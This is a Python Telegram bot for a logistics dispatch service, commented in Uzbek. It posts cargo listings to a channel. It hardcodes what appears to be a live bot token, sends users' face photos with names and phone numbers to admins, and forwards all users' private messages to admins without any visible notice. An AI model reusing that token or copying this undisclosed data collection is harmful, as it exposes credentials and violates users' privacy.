import logging
import json
import base64
from datetime import datetime, timedelta
from io import BytesIO
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import WebAppInfo, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# --- ASOSIY SOZLAMALAR ---
TOKEN = "8791239714:AAH17eobRUq3xCUMYJipwcSrmYPJPfZr3Rs"
ADMINS = [6977836294, 8112179116] 
KANAL_ID = "@MADIWAYy"

# DIQQAT: Bu yerga o'zingizning GitHub sayt manzilingizni aniq yozing!
WEB_APP_URL = "https://madiway.github.io/madiway-bot/" 
BANNER_IMG = "madiway banner.jpg"

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# Ma'lumotlar ombori (Vaqtinchalik)
user_limits = {} 
chat_history = {}

# --- START BUYRUG'I ---
@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    is_admin = user_id in ADMINS
    status_icon = "🛡 **Siz tizimda: Admin ✅**" if is_admin else "👤 **Siz tizimda: Foydalanuvchi**"
    
    # Siz yuborgan matn
    msg_text = (
        "🏔 **MadiWay | Global Logistics & Dispatch** 🚀\n\n"
        "Xalqaro yuk tashish va professional dispetcherlik xizmatlari tarmog'iga xush kelibsiz!\n"
        "Biz to'rtta davlatni yagona xavfsiz marshrut bilan bog'laymiz:\n\n"
        "🌍 **Bizning yo'nalishlar:**\n"
        "📍 O'zbekiston 🇺🇿\n"
        "📍 Qozog'iston 🇰🇿\n"
        "📍 Rossiya 🇷🇺\n"
        "📍 Ozarbayjon 🇦🇿\n\n"
        f"{status_icon}\n\n"
        "✅ Ishonchlilik: Yukingiz manzili va vaqti bizning nazoratimizda.\n"
        "✅ Tezkorlik: Eng qulay va xavfsiz yo'llarni taqdim etamiz.\n"
        "✅ Professional Dispetcherlik: 24/7 aloqa va harakat nazorati.\n\n"
        "🚛 **MadiWay — Sizning yukingiz, bizning mas'uliyatimiz!**\n\n"
        "📥 Bog'lanish uchun: @Madiways\n"
        "🔗 Kanalimiz: T.me/MADIWAYy"
    )
    
    # Web App tugmasi
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("🏔 MadiWay Ilovasi", web_app=WebAppInfo(url=WEB_APP_URL)))
    
    if is_admin:
        kb.add(KeyboardButton("📩 Chat Monitoring (Lichkalar)"))

    try:
        # Rasm bilan yuborish
        with open(BANNER_IMG, 'rb') as photo:
            await message.answer_photo(photo, caption=msg_text, parse_mode="Markdown", reply_markup=kb)
    except:
        # Rasm topilmasa faqat tekst yuboriladi
        await message.answer(msg_text, parse_mode="Markdown", reply_markup=kb)

# --- WEB APP'DAN MA'LUMOT QABUL QILISH ---
@dp.message_handler(content_types=types.ContentType.WEB_APP_DATA)
async def web_app_data_handler(message: types.Message):
    try:
        data = json.loads(message.web_app_data.data)
        user = message.from_user
        now = datetime.now()

        # 1. Login/Face ID hisoboti
        if data.get("action") == "login_report":
            auth = data.get("auth")
            img_bytes = base64.b64decode(auth['img'].split(',')[1])
            caption = f"👤 **FACE ID LOGIN**\n\n👤 {auth['name']}\n📞 {auth['phone']}\n🆔 `{user.id}`"
            for admin in ADMINS:
                try: await bot.send_photo(admin, BytesIO(img_bytes), caption=caption, parse_mode="Markdown")
                except: pass

        # 2. Yukni kanalga chiqarish
        elif data.get("action") == "post":
            if user.id not in ADMINS:
                if user.id in user_limits:
                    if now < user_limits[user.id] + timedelta(days=55):
                        return await message.answer("⚠️ Kunlik limit: 55 kundan keyin yuk qo'sha olasiz.")
                user_limits[user.id] = now

            post_text = (
                f"🚛 **#YANGI_YUK**\n\n"
                f"📦 **Tavsif:** {data['content']}\n"
                f"⏰ **Vaqt:** {data['time']}\n"
                f"🔄 **Soni:** {data['repeat']} marta\n\n"
                f"👤 **Yuboruvchi:** {user.first_name}\n"
                f"🏁 @MADIWAYy"
            )
            
            kb = InlineKeyboardMarkup(row_width=1)
            kb.add(
                InlineKeyboardButton("💬 Lichkaga yozish", url=f"tg://user?id={user.id}"),
                InlineKeyboardButton("🚀 Yuk Joylash", url=f"https://t.me/madiway_bot?start=post")
            )
            await bot.send_message(KANAL_ID, post_text, reply_markup=kb, parse_mode="Markdown")
            await message.answer("✅ Muvaffaqiyatli yuborildi!")
            
    except Exception as e:
        logging.error(f"Data xatosi: {e}")

# --- MONITORING (Lichka xabarlari) ---
@dp.message_handler(lambda m: m.chat.type == 'private' and not m.text.startswith('/'))
async def monitor_messages(message: types.Message):
    if message.from_user.id in ADMINS: return
    
    for admin in ADMINS:
        try:
            await bot.send_message(admin, f"👁 **Yangi xabar:**\n👤 {message.from_user.full_name}\n💬 {message.text}")
        except: pass

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
